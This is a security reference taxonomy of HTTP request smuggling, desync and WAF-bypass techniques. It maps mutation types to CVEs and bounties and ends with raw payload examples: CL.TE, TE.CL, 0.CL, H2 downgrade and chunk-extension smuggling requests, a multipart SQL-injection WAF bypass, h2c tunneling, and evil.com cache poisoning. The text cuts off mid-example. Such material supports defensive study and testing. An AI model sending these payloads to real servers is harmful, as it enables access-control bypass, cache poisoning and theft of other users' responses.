\# HTTP Request Smuggling \& Desync — Mutation Taxonomy (2025)



---



\## Classification Structure



HTTP mutations are classified along three axes:



\- \*\*Axis 1 — Mutation Target\*\* (primary): \*What structural component of the HTTP message is mutated?\* This axis defines the main body of this document (§1–§8).

\- \*\*Axis 2 — Discrepancy Type\*\* (cross-cutting): \*What kind of interpretation mismatch does the mutation create?\* Every mutation must produce at least one of the four discrepancy types below.

\- \*\*Axis 3 — Attack Scenario\*\* (mapping): \*Under what architectural conditions is the mutation weaponized?\* Covered in the scenario mapping table.



The three axes are not independent. A real-world exploit almost always combines mutations from multiple §-categories.



\### The Four Discrepancy Types (Axis 2)



Every exploitable mutation ultimately produces one or more of these mismatches between two HTTP agents in the request path.



| Discrepancy Type | Definition |

|---|---|

| \*\*Framing mismatch\*\* | Disagreement on \*where a request ends\* — the root cause of all smuggling |

| \*\*Path mismatch\*\* | Same URI resolved to different resources — root cause of cache deception and ACL bypass |

| \*\*Host mismatch\*\* | Different determination of the target host — root cause of routing manipulation and SSRF |

| \*\*Body semantics mismatch\*\* | Same body bytes parsed into different parameters/values — root cause of WAF bypass |



\### The Four Length Interpretation Methods



In mixed HTTP/1.1 + HTTP/2 environments, there are exactly four ways a server can determine where the message body ends. All framing mutations are notated as combinations of these.



| Abbreviation | Interpretation |

|---|---|

| \*\*CL\*\* | Byte count from the `Content-Length` header |

| \*\*TE\*\* | Chunk boundaries from `Transfer-Encoding: chunked` |

| \*\*0\*\* | No length-specifying header present → implicitly zero body (implicit-zero) |

| \*\*H2\*\* | Built-in length field of the HTTP/2 DATA frame |



---



\## §1. Message Framing Mutations



Mutations that cause two servers to disagree on \*"how many bytes belong to this request's body."\* This is the starting point of all HTTP Request Smuggling.



\### §1-1. CL ↔ TE Priority Conflict



RFC 7230 mandates that when both Content-Length and Transfer-Encoding are present, TE takes precedence. Implementations diverge.



| Notation | Front-End Interpretation | Back-End Interpretation |

|---|---|---|

| \*\*CL.TE\*\* | Content-Length | Transfer-Encoding |

| \*\*TE.CL\*\* | Transfer-Encoding | Content-Length |

| \*\*TE.TE\*\* | TE (parsed normally) | TE (obfuscated → ignored → CL fallback) |



CL.TE and TE.CL are the oldest types, first documented in 2005 and still the most common. TE.TE requires TE header obfuscation (§2) as a prerequisite.



\### §1-2. Zero-Length Family



Asymmetries where one side sees a body and the other sees none, without both CL and TE being present.



| Notation | Mechanism | Key Condition |

|---|---|---|

| \*\*CL.0\*\* | Front-End parses CL and reads the body; Back-End ignores CL and treats the body as the start of the next request | Manifests primarily on endpoints that don't expect POST bodies — static files, redirects, error pages |

| \*\*0.CL\*\* | Front-End sees no body (implicit zero) and forwards immediately; Back-End reads CL bytes → \*\*deadlock\*\* | Requires an \*\*Early Response Gadget\*\* to break the deadlock: static file requests, Windows reserved filenames (CON, PRN, AUX, NUL), server-level redirects, `Expect: 100-continue` |

| \*\*TE.0\*\* | Front-End parses TE; Back-End doesn't support TE and treats body as zero | Demonstrated against Google Cloud Load Balancer ($8,500 bounty) |



0.CL was historically dismissed as "unexploitable due to deadlock." Early Response Gadgets — endpoints that respond before consuming the full body — proved this assumption wrong. As of 2025, 0.CL has been confirmed at scale against major CDNs/proxies (CVE-2025-32094, Akamai; plus Cloudflare, Netlify), and the typical pattern combines 0.CL with CL header whitespace obfuscation (`Content-Length : 76`, see §2-2) to prevent the Front-End from recognizing the header.



\### §1-3. HTTP/2 Downgrade Framing



Mismatches between H2 frame-level length and the CL/TE headers that survive (or are injected during) HTTP/2 → HTTP/1.1 translation.



| Notation | Mechanism |

|---|---|

| \*\*H2.CL\*\* | H2 frame length disagrees with the CL header value retained after downgrade |

| \*\*H2.TE\*\* | TE header that should be stripped per H2 spec survives the downgrade |

| \*\*H2.0\*\* | H2 request sent without CL → after downgrade, Back-End misjudges body presence |



H2→1.1 downgrading is inherently \*more dangerous\* than HTTP/1.1-only chains because the H2 binary framing introduces a fourth length interpretation, expanding the mismatch combinatorics. AWS ALB's H2.0 vulnerability was patched within 5 days of report.



\### §1-4. Timing-Based Desync



Exploiting \*temporal\* behavior rather than protocol grammar to create framing mismatches.



| Type | Mechanism |

|---|---|

| \*\*Pause-based CL.0\*\* | Send headers only, then deliberately pause → Back-End times out and responds → the body arriving afterward is interpreted as a new request. Demonstrated against Apache HTTP Server with server-level redirects |

| \*\*Expect-based 0.CL\*\* | Use `Expect: 100-continue` to manipulate the Back-End's body-read timing, bypassing the 0.CL deadlock |



---



\## §2. Header Obfuscation Mutations



Mutations that subtly deform header names, values, or structure so that only a subset of servers in the chain recognize or ignore the header. This category is the \*\*enabling mechanism\*\* for all framing mismatches in §1.



\### §2-1. Transfer-Encoding Obfuscation



The core vector for TE.TE attacks. The space of possible mutations is effectively infinite.



| Technique | Mutation Example | Parser Difference |

|---|---|---|

| \*\*Value pollution\*\* | `Transfer-Encoding: xchunked` | One side ignores the invalid value; the other leniently accepts it |

| \*\*Colon whitespace\*\* | `Transfer-Encoding : chunked` | Some parsers include the space in the header name, treating it as an unknown header |

| \*\*Tab injection\*\* | `Transfer-Encoding:\\tchunked` | Implementations that don't equate tab with space |

| \*\*Line folding\*\* | `Transfer-Encoding:\\r\\n chunked` | Obsolete line folding (deprecated in RFC 7230 §3.2.4) is still accepted by some servers. CVE-2025-32094 (Akamai) |

| \*\*Header duplication\*\* | `Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x` | First-wins vs last-wins policy |

| \*\*Case variation\*\* | `transfer-ENCODING: chunked` | Spec mandates case-insensitive, but implementations differ |

| \*\*Leading whitespace\*\* | `·Transfer-Encoding: chunked` | Some servers fail to recognize the header |

| \*\*Chunk extension\*\* | `5;ext=1\\r\\nHELLO` | Parsing/ignoring of the extension field after the semicolon in the chunk-size line |

| \*\*TERM.EXT\*\* | `\\n` inside a chunk extension: proxy treats it as line terminator; Back-End treats it as part of the extension → hidden second request | CVE-2025-55315 (ASP.NET Core Kestrel, CVSS 9.9) |

| \*\*EXT.TERM\*\* | Reverse: only the Back-End treats `\\n` as a line terminator, shifting chunk boundaries | Complementary to TERM.EXT |

| \*\*TERM.SPILL\*\* | Oversized chunk (body larger than declared size): proxy ignores the excess bytes (spill); Back-End interprets them as line terminator + new chunk header | Enables smuggling \*without\* CL-vs-TE confusion |

| \*\*SPILL.TERM\*\* | Reverse: Back-End ignores spill; proxy recognizes a line terminator within the spill | Complementary to TERM.SPILL |

| \*\*Miscellaneous chunk malformations\*\* | Incorrect chunk terminators, 2-byte chunk-body terminator overread, ambiguous trailer-section newlines | Leniency varies per parser |



WAFs tend to block these with regex patterns — a \*\*fingerprint-based defense\*\* that catches only known mutations and is trivially bypassable with minor variations. The structural solution is primitive-level mismatch detection rather than pattern matching.



\### §2-2. Content-Length Obfuscation



| Technique | Mutation Example | Parser Difference |

|---|---|---|

| \*\*Colon whitespace\*\* | `Content-Length : 42` | Core enabler for 0.CL attacks (§1-2): Front-End fails to recognize the CL header |

| \*\*Header duplication\*\* | `Content-Length: 0\\r\\nContent-Length: 42` | First-wins vs last-wins policy |

| \*\*Signs and prefixes\*\* | `Content-Length: +42`, `Content-Length: 042` | Octal vs decimal, sign handling |

| \*\*Non-numeric characters\*\* | `Content-Length: 42abc` | Extract leading digits vs reject entirely |

| \*\*Negative / overflow\*\* | `Content-Length: -1`, extremely large values | Integer parsing underflow/overflow |



\### §2-3. HTTP/2 Binary-Level Header Mutations



Exploiting H2's binary framing to inject or preserve headers that produce different interpretations after downgrade to HTTP/1.1.



| Technique | Mechanism |

|---|---|

| \*\*CRLF injection in H2 header values\*\* | `\\r\\n` is meaningless in H2 but becomes a header delimiter after downgrade → arbitrary header injection (TE, CL, etc.) |

| \*\*Pseudo-header manipulation\*\* | Tampering with `:method`, `:path`, `:authority` → request-line / Host mismatch after downgrade |

| \*\*Forbidden header passthrough\*\* | `transfer-encoding`, `connection`, etc. that H2 spec requires to be stripped survive the translation |

| \*\*Special characters in header names\*\* | Characters illegal in HTTP/1.1 header names inserted via H2 → downgrade parser misidentifies headers |

| \*\*H2C tunneling\*\* | `Upgrade: h2c` to initiate clear-text HTTP/2 → bypasses Edge's HTTP/1.1 validation and tunnels raw H2 frames |



---



\## §3. Request-Line \& URL Mutations



Mutations that cause a proxy/CDN/cache and the origin server to \*\*map the same URL to different resources\*\*. These produce \*path mismatch\* and are the basis for Web Cache Deception, Web Cache Poisoning, and ACL bypass.



| Technique | Mutation Example | Mismatch Effect |

|---|---|---|

| \*\*Path suffix confusion\*\* | `/account.php/image.png` | Cache sees `.png` → static; origin executes `account.php` |

| \*\*URL encoding asymmetry\*\* | `%2F` vs `/`, double-encoding `%252F` | Differences in normalization depth and timing |

| \*\*Path parameter (`;`)\*\* | `/admin;.js` | Servers like Tomcat strip after `;`; others treat it as part of the path |

| \*\*Dot segment normalization\*\* | `/admin/..%2Fsecret` | Proxy normalizes first vs origin receives the encoded form |

| \*\*Null byte insertion\*\* | `/admin%00.png` | C-based servers truncate at null |

| \*\*Backslash/slash confusion\*\* | `\\admin` → `/admin` | Windows/IIS path normalization |

| \*\*Module pipeline mismatch\*\* | Apache `mod\_rewrite` → `mod\_proxy` URL interpretation divergence | CVE-2024-38474 (Apache HTTP Server RCE) |

| \*\*URL decode ordering error\*\* | ModSecurity URL-decodes before query separation | CVE-2024-1019: encoded payloads bypass path-based WAF rules |

| \*\*WAF exception paths\*\* | `/.well-known/acme-challenge/` and similar | WAF skips inspection on these paths → direct origin attack (Cloudflare ACME bypass, 2025) |



---



\## §4. Host Identification Mutations



Mutations that create contradictions between the multiple mechanisms for determining a request's target host (Host header, absolute URI, `:authority`, `X-Forwarded-Host`, etc.).



| Technique | Mutation Example | Mismatch Effect |

|---|---|---|

| \*\*Host header duplication\*\* | `Host: evil.com\\r\\nHost: target.com` | First-wins vs last-wins policy |

| \*\*Absolute URI + Host conflict\*\* | `GET http://evil.com/ HTTP/1.1\\r\\nHost: target.com` | RFC mandates absolute URI takes precedence, but implementations vary |

| \*\*X-Forwarded-Host injection\*\* | `X-Forwarded-Host: evil.com` | Pollutes internal routing and cache key generation |

| \*\*`:authority` vs Host\*\* | H2 `:authority` and post-downgrade Host header disagree | Virtual host selection and routing confusion |

| \*\*Port inclusion/omission\*\* | `Host: target.com:443` vs `Host: target.com` | Cache key splitting, virtual host mapping differences |

| \*\*Internal header spoofing\*\* | `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` | Framework uses these headers instead of the actual request path for routing |



---



\## §5. Body Structure \& Content-Type Mutations



Mutations that make a WAF and a web framework \*\*parse the same HTTP body into different parameters/values\*\*. The attack payload itself is not modified — only the \*container structure\* changes. This distinction separates body structure mutations from traditional payload encoding evasion (§8).



\### §5-1. Content-Type Switching \& Confusion



| Technique | Mutation Example | Mismatch Effect |

|---|---|---|

| \*\*CT substitution\*\* | Send `multipart/form-data` to a urlencoded endpoint | WAF applies wrong parsing rule set. Empirically 90%+ of websites accept both CTs interchangeably |

| \*\*CT omission\*\* | Remove Content-Type header entirely | Framework's default parser diverges from WAF's assumed parser |

| \*\*CT–body mismatch\*\* | `Content-Type: application/json` header with a multipart body | WAF applies JSON rules; app parses the actual body format |

| \*\*CT parameter pollution\*\* | `Content-Type: multipart/form-data; boundary=a; boundary=b` | Which boundary is adopted determines the parse result |

| \*\*Non-standard CT\*\* | `Content-Type: text/plain` with JSON/XML body | WAF skips structured inspection; framework parses body structure |

| \*\*Charset tampering\*\* | `charset=ibm037` (EBCDIC), `charset=utf-7` | Payload encoded in legacy charset evades signature matching |



\### §5-2. Multipart/form-data Structure Mutations



| Technique | Description |

|---|---|

| \*\*Boundary header tampering\*\* | Semicolons in boundary value; RFC 2231 parameter continuation to split the boundary declaration → WAF uses fake boundary, app uses real one |

| \*\*Boundary body tampering\*\* | Dash count, whitespace, and CRLF handling differences in body delimiters |

| \*\*Content-Disposition tampering\*\* | Quote presence/absence on field/file names, encoding, escaping differences |

| \*\*Preamble/Epilogue insertion\*\* | Payloads hidden before the first boundary (preamble) or after the last (epilogue) — RFC mandates ignoring these, but some parsers process them |

| \*\*Whitespace/tab substitution\*\* | Replacing spaces with tabs in CT header values |

| \*\*Non-standard field name characters\*\* | Invalid characters in field names → WAF fails to recognize the parameter |

| \*\*CT header parameter removal\*\* | Removing secondary parameters (e.g., `name`) alters WAF behavior |



\### §5-3. JSON Structure Mutations



| Technique | Description |

|---|---|

| \*\*Duplicate keys\*\* | `{"key":"safe","key":"<xss>"}` — which value is adopted varies by parser (RFC 8259 leaves this undefined) |

| \*\*Unicode escapes\*\* | `\\u003cscript\\u003e` → WAF sees string literal; app decodes to HTML |

| \*\*Non-standard comments\*\* | `/\* \*/`, `//` — absent from JSON spec but accepted by some parsers (e.g., Jackson) |

| \*\*Null bytes\*\* | `\\x00` within values to halt WAF parser mid-stream |

| \*\*Type confusion\*\* | Switching between number/string/boolean to evade type-specific signatures |

| \*\*Deep nesting\*\* | Extreme JSON depth exceeding WAF parser recursion/memory limits |



\### §5-4. XML Structure Mutations



| Technique | Description |

|---|---|

| \*\*DOCTYPE closure confusion\*\* | Extra characters after DOCTYPE declaration disrupt WAF XML parse state |

| \*\*Schema closure manipulation\*\* | Shifting XML schema closing tags, injecting elements/attributes to distort structure |

| \*\*Strategic newline placement\*\* | Newlines between XML tags positioned to break WAF rule matching |

| \*\*Encoding declaration tampering\*\* | `<?xml encoding="UTF-7"?>` confuses WAF charset interpretation |

| \*\*CDATA section abuse\*\* | `<!\[CDATA\[<script>]]>` — payload hidden inside CDATA |

| \*\*Internal entity expansion\*\* | Entity definitions/references for WAF bypass (not XXE-targeted) |



---



\## §6. Connection \& Protocol Mechanism Mutations



Mutations that exploit \*\*protocol behaviors outside message grammar\*\* — TCP connection reuse, protocol upgrades, timing, and TLS layer interactions.



| Technique | Mechanism |

|---|---|

| \*\*Connection reuse prerequisite\*\* | Residual bytes on a keep-alive connection being concatenated with the next request is the foundational condition for all server-side HRS |

| \*\*Pipelining confusion\*\* | Parsing boundary differences when multiple requests are serialized on a single connection. Distinguishing smuggling from legitimate pipelining is a key detection challenge |

| \*\*Upgrade header abuse\*\* | `Upgrade: h2c` for clear-text H2; `Upgrade: websocket` for protocol switch → bypasses Edge's HTTP/1.1 validation |

| \*\*Connection header manipulation\*\* | `Connection: Transfer-Encoding` induces an intermediary proxy to strip TE as a hop-by-hop header |

| \*\*Expect: 100-continue\*\* | Manipulating the server's 100 Continue response timing to desynchronize body reading |

| \*\*Request pause\*\* | Deliberate mid-request delay (e.g., via Turbo Intruder) → Back-End timeout → body interpreted as next request |

| \*\*TLS Upgrade Desync\*\* | HTTP desync during TLS upgrade process → session hijacking even over encrypted connections. CVE-2025-49812 (Apache ≤2.4.63) |

| \*\*Opossum Attack (Cross-Protocol TLS Desync)\*\* | MITM intercepts victim's implicit TLS connection (port 443) and redirects to server's opportunistic TLS port (port 80) → \*\*permanent\*\* client-server response stream desync after TLS handshake completes. Affects HTTP, SMTP, FTP, POP3. 3M+ hosts potentially vulnerable. Bypasses all ALPACA (2021) countermeasures. The vulnerability is in the protocol design (implicit + opportunistic TLS coexistence), not in any implementation bug |

| \*\*Cross-protocol smuggling\*\* | Residual body bytes reinterpreted as HTTP/2 frames. CVE-2022-41721 (Go `MaxBytesHandler`) |

| \*\*Service mesh sidecar bypass\*\* | Envoy and similar sidecar proxies failing to sanitize headers before forwarding to upstream services. CVE-2024-23326 (Envoy Request Tunneling) |

| \*\*Inter-runtime leniency divergence\*\* | Within the same cluster, Go (accepts bare LF, CVE-2025-22871), Node.js (strict), Python (lenient) — differing parser leniency between microservice runtimes is the root of intra-cluster desync |



---



\## §7. Low-Level Parser Implementation Divergence



Micro-level differences in how individual servers and proxies implement HTTP parsing relative to the RFC. These underlie all mutations in §1–§6 and are systematically discoverable via coverage-guided differential fuzzing.



| Technique | Description |

|---|---|

| \*\*Bare LF (`\\n` without `\\r`)\*\* | Using LF-only line endings — acceptance/rejection varies per server |

| \*\*Integer parsing differences\*\* | `0x` prefix, leading zeros, `±` signs, overflow handling in CL and chunk sizes |

| \*\*Unknown method handling\*\* | How servers determine body presence for non-standard methods (e.g., `CATS`) |

| \*\*HTTP version string\*\* | Acceptance/rejection and behavioral changes for `HTTP/1.2`, `HTTP/0.9`, etc. |

| \*\*Empty header values\*\* | `Header-Name:` (no value) — some implementations merge with previous header |

| \*\*Special characters in header names\*\* | Underscores (`\_`), dots (`.`), spaces — Nginx defaults to `underscores\_in\_headers off` |

| \*\*Trailer handling\*\* | Injecting forbidden headers (CL, TE) in chunked encoding trailers |

| \*\*Request-line whitespace\*\* | Extra spaces or tabs in `GET /path HTTP/1.1` |



---



\## §8. Payload-Level Obfuscation



Unlike §1–§7 which mutate \*\*message structure\*\*, this category mutates \*\*the payload representation itself\*\* to evade WAF signatures. Independent of HRS but commonly combined with §5 (body structure mutations) in practice.



| Technique | Example |

|---|---|

| \*\*Encoding substitution\*\* | URL encoding, HTML entities, Unicode normalization, IBM037 (EBCDIC) |

| \*\*Case/whitespace insertion\*\* | `SeLeCt`, `UN/\*\*/ION` — breaking SQL/XSS signatures |

| \*\*HTTP Parameter Pollution\*\* | Duplicate parameter names → servers vary on first/last/array handling |

| \*\*Oversized requests\*\* | Body exceeding WAF inspection limits (typically 4KB–64KB) → inspection skipped |

| \*\*Non-standard HTTP methods\*\* | Payloads via PUT, PATCH, DELETE that WAFs don't inspect |

| \*\*Legacy cookie parser abuse\*\* | `$Version` cookie attributes and quoted-string encoding to bypass WAF rules |

| \*\*Internal header spoofing\*\* | `X-HTTP-Method-Override`, `X-Middleware-Subreq` (CVE-2025-29927, CVSS 9.1) to alter framework behavior |



---



\## Attack Scenario Mapping (Axis 3)



How the mutations above are \*\*weaponized\*\* under specific architectural conditions.



| Scenario | Architecture | Primary Mutation Categories |

|---|---|---|

| \*\*Server-Side HRS\*\* | Front-End (proxy/CDN/WAF) ↔ Back-End with persistent connection | §1 + §2 + §6 |

| \*\*Client-Side Desync\*\* | Single server possible; victim's browser desyncs its HTTP/1.1 connection | §1-2 (CL.0) + §1-4 (Pause) + §6 |

| \*\*Browser-Powered Desync\*\* | Attacker JS → victim's browser → target server | §1-2 + §6; requires target lacking HTTP/2 |

| \*\*Response Queue Poisoning\*\* | Post-desync response queue corruption → stealing other users' responses. HEAD request CL + response concatenation enables cache poisoning | §1 (all framing) + §2 |

| \*\*Response Smuggling / Splitting\*\* | Two complete requests smuggled to desync the \*\*response\*\* queue — attacker-controlled response delivered to victim; HttpOnly cookie theft | §1 + §2 + §6; requires timing differential (sleepy request) |

| \*\*Web Cache Deception / Poisoning\*\* | Path/host interpretation difference between CDN/cache and origin | §3 + §4 |

| \*\*WAF Body Inspection Bypass\*\* | Content-Type/body parsing difference between WAF and web framework | §5 + §8; no HRS required |

| \*\*ACL / Authentication Bypass\*\* | Path/host interpretation difference between proxy routing and origin routing | §3 + §4 + §8 (internal headers) |

| \*\*Microservice Internal Desync\*\* | Service mesh (Envoy/Istio) + heterogeneous runtimes (Go/Node/Python) with differing parser leniency | §6 + §7; manifests even on internal networks |

| \*\*Cross-Protocol TLS Desync (Opossum)\*\* | MITM + server supporting both implicit and opportunistic TLS → permanent response stream desync | §6 (TLS Upgrade / Opossum); affects SMTP, FTP beyond HTTP |

| \*\*Cache Poisoning → C2 Side Channel\*\* | CL.0 desync poisons CDN's 3xx redirect into global cache; Location header repurposed as covert C2 channel | §1-2 (CL.0) + §3 (path) + CDN cache |



---



\## CVE / Bounty Mapping (2023–2025)



| Mutation Combination | CVE / Case | Impact / Bounty |

|---|---|---|

| §1-2 (0.CL) + §2-2 (CL whitespace) + Early Response Gadget | CVE-2025-32094 (Akamai) | $9,000. Full infrastructure impact; 65-day patch cycle; tens of millions of sites affected |

| §1-2 (0.CL) + §1-4 (Expect) + §2-1 (TE line folding) | 2025 large-scale campaign | $200K+ bounties across Akamai, Cloudflare, Netlify within 2 weeks |

| §1-2 (TE.0) | Google Cloud Load Balancer | $8,500 (Google VRP) |

| §1-3 (H2.0, no CL sent) | AWS ALB | Patched within 5 days |

| §5 (CT switching + structure mutations) × 5 WAFs × 6 frameworks | ACSAC 2025 research | 1,207 bypasses. Google Cloud Armor Tier 1 classification |

| §3 (module pipeline mismatch) | CVE-2024-38474 (Apache HTTP Server) | RCE via `mod\_rewrite` → `mod\_proxy` path confusion |

| §3 (URL decode ordering) | CVE-2024-1019 (ModSecurity v3) | Complete bypass of path-based WAF rules |

| §8 (internal header spoofing) | CVE-2025-29927 (Next.js, CVSS 9.1) | `x-middleware-subreq` header fully bypasses auth middleware |

| §3 (WAF exception path) | Cloudflare ACME path bypass (2025.10) | `/.well-known/acme-challenge/` exempt from WAF → direct origin attack |

| §2-3 (H2 CRLF injection) | python-hyper/h2 GHSA | Affects numerous H2→1.1 proxies |

| §2-1 (obsolete line folding) + OPTIONS method | CVE-2025-32094 (detail) | Line folding not stripped in OPTIONS-specific parser path |

| §2-1 (TERM.EXT / EXT.TERM chunk extension) | CVE-2025-55315 (ASP.NET Core Kestrel) | CVSS 9.9 — Microsoft's highest-ever for ASP.NET Core. `\\r`/`\\n`/`\\r\\n` handling divergence enables request + response smuggling |

| §2-1 (bare semicolon chunk extension) | Imperva disclosure (2025.08) | Proxy ignores malformed extension; Back-End treats newline as chunk header end → security control bypass |

| §6 (Opossum / cross-protocol TLS desync) | CVE-2025-49812 (Apache ≤2.4.63) | Permanent desync when implicit + opportunistic TLS coexist. 3M+ hosts potentially vulnerable |

| §7 (bare LF acceptance) | CVE-2025-22871 (Go net/http) | Go runtime accepts bare LF as line terminator → microservice desync |

| §6 (sidecar bypass) | CVE-2024-23326 (Envoy Proxy) | Service mesh sidecar forwards unsanitized headers to upstream |

| §1-2 (CL.0) + §3 (path) + global cache poisoning | 2025 research | CL.0 desync poisons 3xx redirects in Akamai/Azure/Oracle CDN global cache; Location header used as C2 channel |

| §6 (pipelining) | CVE-2023-25950 (HAProxy 2.6/2.7) | HTX parser incorrectly merges pipelined requests |



---



\## Payload Examples

Each example shows the **raw HTTP bytes** sent by the attacker. `\r\n` is shown explicitly. `SP` = space. The smuggled (hidden) request is marked with `[SMUGGLED]`.

### §1-1. CL.TE — Classic

Front-End uses Content-Length (13); Back-End uses Transfer-Encoding (chunked). The Back-End sees `0\r\n\r\n` as chunk terminator, then interprets the remaining bytes as the **start of the next request**.

```
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-Ignore: x
```

- Front-End reads 35 bytes of body (everything after the blank line), forwards as one request.
- Back-End parses `0\r\n\r\n` → end of chunked body → `GET /admin` becomes the next request.

### §1-1. TE.CL — Classic

Front-End uses Transfer-Encoding (chunked); Back-End uses Content-Length (4). The Back-End stops reading after 4 bytes, leaving the rest on the socket.

```
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

- Front-End processes chunked encoding (chunk size `5c` = 92 bytes), forwards the entire message.
- Back-End reads only 4 bytes (`5c\r\nG`) via CL:4, treats the rest (`POST / HTTP/1.1...`) as a new request.

### §1-1. TE.TE — Obfuscated Transfer-Encoding

One side recognizes the obfuscated TE; the other falls back to CL. Combines §1-1 with §2-1.

```
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-Encoding: x\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

Other TE obfuscation variants (any one may flip the parser's decision):
```
Transfer-Encoding : chunked          ← space before colon
Transfer-Encoding: xchunked          ← value pollution
Transfer-Encoding:\tchunked          ← tab instead of space
Transfer-Encoding:\r\n chunked       ← obsolete line folding
Transfer-Encoding: chunked\r\n
Transfer-Encoding: x                 ← duplicate header
```

### §1-2. CL.0 — Content-Length Ignored by Back-End

Back-End ignores CL on endpoints that don't expect a body (static files, redirects). The body becomes the next request.

```
POST /static/image.png HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 30\r\n
Connection: keep-alive\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-Pad: x
```

- Front-End reads 30 bytes of body via CL, forwards as one request.
- Back-End serves `/static/image.png`, ignores the body → `GET /admin` left on socket as next request.

### §1-2. 0.CL — With Early Response Gadget

Front-End sees no body (no CL recognized); Back-End reads CL bytes. Requires an **Early Response Gadget** to break the deadlock.

```
GET /redirect HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length : 30\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-Pad: x
```

- `Content-Length : 30` (space before colon) — Front-End doesn't recognize it → forwards immediately with no body.
- Back-End recognizes it → waits for 30 bytes → but `/redirect` returns 301 early (Early Response Gadget) → Back-End responds → the 30 bytes become the next request.

### §1-3. H2.CL — HTTP/2 Downgrade

HTTP/2 DATA frame length disagrees with the CL header that survives downgrade.

```
:method: POST
:path: /
:authority: vulnerable.com
content-length: 0

GET /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- H2 DATA frame contains the full body (including the smuggled request).
- After H2→1.1 downgrade, the proxy writes `Content-Length: 0` but includes the body → Back-End reads zero bytes via CL → `GET /admin` becomes the next request.

### §1-3. H2.TE — Forbidden Header Survives Downgrade

```
:method: POST
:path: /
:authority: vulnerable.com
transfer-encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- H2 spec forbids `transfer-encoding` header, but the proxy fails to strip it during downgrade.
- Back-End receives the downgraded HTTP/1.1 request with TE:chunked → `0\r\n\r\n` ends the body → `GET /admin` is next.

### §1-3. H2 CRLF Injection in Header Value

Inject CRLF in an H2 header value to create arbitrary headers after downgrade.

```
:method: POST
:path: /
:authority: vulnerable.com
foo: bar\r\nTransfer-Encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- In H2, `\r\n` is just bytes in a header value — no structural meaning.
- After downgrade to HTTP/1.1: `\r\n` becomes a header delimiter → `Transfer-Encoding: chunked` is injected.

### §1-4. Pause-Based CL.0

Send headers, deliberately pause, then send body after timeout.

```
[Step 1 — Send headers only]
POST /redirect HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 41\r\n
\r\n

[Step 2 — Wait ~30s for server timeout + early response]

[Step 3 — Send body after server has responded]
GET /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- Back-End times out waiting for the body, sends 301 redirect response.
- When the body arrives, it's treated as a new request: `GET /admin`.

### §2-1. Chunk Extension Mutations (TERM.EXT / EXT.TERM)

**TERM.EXT** — `\n` inside chunk extension: proxy treats it as line terminator; Back-End treats it as part of extension.

```
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Transfer-Encoding: chunked\r\n
\r\n
2;ext=\nGET /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
AB\r\n
0\r\n
\r\n
```

- Proxy: `\n` terminates chunk-size line → chunk size = 2 → reads `GE` → parsing continues.
- Back-End: `\n` is part of extension → chunk size = 2 → reads `AB` → `GET /admin` is hidden from proxy but visible after desync.

**TERM.SPILL** — Oversized chunk body: excess bytes spill into the next message.

```
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Transfer-Encoding: chunked\r\n
\r\n
5\r\n
HELLOGET /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
\r\n
0\r\n
\r\n
```

- Proxy: reads 5 bytes (`HELLO`), ignores excess bytes until next chunk delimiter.
- Back-End: reads 5 bytes, then treats the excess `GET /admin...` as a line terminator + new request.

### §5. WAF Bypass — Content-Type Confusion

Bypass WAF body inspection by switching Content-Type so WAF applies wrong parser.

```
POST /api/search HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Type: multipart/form-data; boundary=abc\r\n
Content-Length: 60\r\n
\r\n
--abc\r\n
Content-Disposition: form-data; name="q"\r\n
\r\n
' OR 1=1--\r\n
--abc--
```

- WAF expects `application/x-www-form-urlencoded` or `application/json` on this endpoint → applies wrong parsing rules → misses the SQL injection payload.
- Application framework accepts multipart and extracts `q=' OR 1=1--`.

**Charset-based evasion (IBM037 / EBCDIC)**:
```
POST /api/login HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Type: application/x-www-form-urlencoded; charset=ibm037\r\n
Content-Length: 30\r\n
\r\n
\xA7\x96\x99...(EBCDIC-encoded "user=admin' OR 1=1--")
```

### §6. H2C Tunneling — Edge Bypass

```
GET / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Upgrade: h2c\r\n
Connection: Upgrade, HTTP2-Settings\r\n
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\n
\r\n
```

- If the front-end proxy blindly forwards `Upgrade: h2c`, the connection upgrades to clear-text HTTP/2.
- Subsequent H2 frames bypass the Edge's HTTP/1.1-level inspection entirely.

### §4. Host Header Poisoning for Cache Poisoning

```
GET /static/main.js HTTP/1.1\r\n
Host: vulnerable.com\r\n
X-Forwarded-Host: evil.com\r\n
\r\n
```

- Cache keys on `Host: vulnerable.com` + path.
- Origin application uses `X-Forwarded-Host` to generate absolute URLs in the response body.
- Cached response now contains `evil.com` references → all subsequent users receive poisoned content.

### Composite: CL.TE → Response Queue Poisoning

Smuggle a complete request to desync the response queue, then steal the next user's response.

```
POST / HTTP/1.1\r\n
